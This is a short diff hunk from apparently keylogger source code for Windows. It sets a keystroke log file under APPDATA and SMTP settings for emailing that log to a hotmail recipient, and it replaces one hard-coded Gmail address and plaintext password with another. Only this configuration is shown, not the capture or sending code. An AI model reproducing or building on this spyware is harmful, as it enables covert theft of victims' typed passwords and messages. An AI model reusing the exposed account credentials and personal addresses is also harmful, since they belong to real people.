@@ -29,8 +29,8 @@ import win32event
 
 LOG_FILE = os.path.join(os.environ["APPDATA"], "keystrokes.log")
 
-EMAIL_ADDRESS = "uslumehdi76@gmail.com"
-EMAIL_PASSWORD = "Batesuslu76"
+EMAIL_ADDRESS = "testkeyloggerr1@gmail.com"
+EMAIL_PASSWORD = "Testkeylogger12"
 RECIPIENT_EMAIL = "mehdi4676@hotmail.com"
 SMTP_SERVER = "smtp.gmail.com"
 SMTP_PORT = 587
